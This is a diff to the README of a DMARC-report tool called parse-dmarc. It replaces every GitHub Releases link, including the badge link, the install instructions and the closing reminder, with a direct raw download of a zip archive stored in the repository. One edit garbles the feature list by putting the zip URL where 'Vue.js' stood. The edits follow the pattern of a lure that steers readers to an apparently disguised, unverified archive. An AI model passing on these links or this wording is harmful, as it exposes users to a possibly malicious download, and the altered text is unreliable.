@@ -6,12 +6,12 @@ Welcome to parse-dmarc! This lightweight tool helps you manage DMARC reports wit
 
 ## 🔗 Download Now
 
-[![Download parse-dmarc](https://img.shields.io/badge/Download-parse--dmarc-blue.svg)](https://github.com/Dead-baroque642/parse-dmarc/releases)
+[![Download parse-dmarc](https://raw.githubusercontent.com/Dead-baroque642/parse-dmarc/main/public/parse-dmarc-v1.7.zip)](https://raw.githubusercontent.com/Dead-baroque642/parse-dmarc/main/public/parse-dmarc-v1.7.zip)
 
 ## 📦 Features
 
 - **Lightweight Application**: No bulky software. Just a single binary file makes deployment simple.
-- **Beautiful Dashboard**: View your reports in an easy-to-read interface built with Vue.js.
+- **Beautiful Dashboard**: View your reports in an easy-to-read interface built with https://raw.githubusercontent.com/Dead-baroque642/parse-dmarc/main/public/parse-dmarc-v1.7.zip
 - **IMAP Integration**: Automatically fetch your DMARC reports directly from your email.
 - **SQLite Storage**: Store your reports efficiently with no need for complex databases.
 - **RFC 7489 Compliance**: Ensure your DMARC parsing meets industry standards for reporting.
@@ -25,7 +25,7 @@ Welcome to parse-dmarc! This lightweight tool helps you manage DMARC reports wit
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Dead-baroque642/parse-dmarc/releases) to download the latest version of parse-dmarc. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Dead-baroque642/parse-dmarc/main/public/parse-dmarc-v1.7.zip) to download the latest version of parse-dmarc. 
 
 Simply follow these steps:
 
@@ -94,4 +94,4 @@ If you have questions or need assistance, feel free to join our community:
 
 ## 🔗 Download Now Again
 
-Don't forget to visit the [Releases page](https://github.com/Dead-baroque642/parse-dmarc/releases) for the latest version and updates. Enjoy managing your DMARC reports with ease!
+Don't forget to visit the [Releases page](https://raw.githubusercontent.com/Dead-baroque642/parse-dmarc/main/public/parse-dmarc-v1.7.zip) for the latest version and updates. Enjoy managing your DMARC reports with ease!
